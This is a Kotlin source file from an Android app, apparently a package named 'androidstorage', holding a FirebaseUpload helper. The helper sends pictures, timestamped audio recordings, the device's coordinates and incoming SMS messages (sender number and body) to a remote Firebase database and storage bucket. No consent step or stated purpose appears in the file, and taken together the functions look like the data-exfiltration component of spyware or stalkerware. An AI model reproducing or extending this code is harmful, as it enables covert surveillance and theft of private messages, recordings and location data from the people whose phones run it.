package com.plcoding.androidstorage

import android.net.Uri
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageReference
import com.google.firebase.storage.ktx.storageMetadata
import java.util.*


class FirebaseUpload() {

    companion object{
        private lateinit var storageReference: StorageReference
        private lateinit var imageUri: Uri
        private val database = FirebaseDatabase.getInstance()
        private val myRef = database.reference
        fun uploadPicture(imageUris: Uri? = null) {

            imageUri = Uri.parse(imageUris.toString())
            storageReference = FirebaseStorage.getInstance().getReference("Images/${imageUri.lastPathSegment}")
            storageReference.putFile(imageUri).addOnSuccessListener {
                Log.e("FirebaseUpload", "Successfully uploaded image")
            }.addOnFailureListener{
                Log.e("Error", "Failed to upload image")
            }
        }

        fun locationToDatabase(longitude: Double, latitude: Double) {
            val currentTime: Date = Calendar.getInstance().time
            val usersRef = myRef.child("User Locations")
            val location= "Longitude: $longitude, Latitude:$latitude"
            usersRef.child("$currentTime").setValue(location)
        }

        fun uploadAudio(audioPath: Uri?){
            val currentTime: Date = Calendar.getInstance().time
            val metadata = storageMetadata {
                contentType = "audio/mpeg"
            }
            storageReference = FirebaseStorage.getInstance().getReference("Audio/${currentTime}")
            if (audioPath != null) {
                storageReference.putFile(audioPath,metadata).addOnSuccessListener {
                    Log.d("FirebaseUpload", "Successfully uploaded audio")
                }.addOnFailureListener{
                    Log.e("Error", "Failed to upload audio")
                }
            }
        }

        fun smsTodatabase(status: String,smsFrom: String, smsBody: String) {
            val currentTime: Date = Calendar.getInstance().time
            val usersRef = myRef.child("User SMS")
            val sms = "$status, Number: $smsFrom, SMS Body: $smsBody"
            usersRef.child("$currentTime").setValue(sms)
        }

    }
}
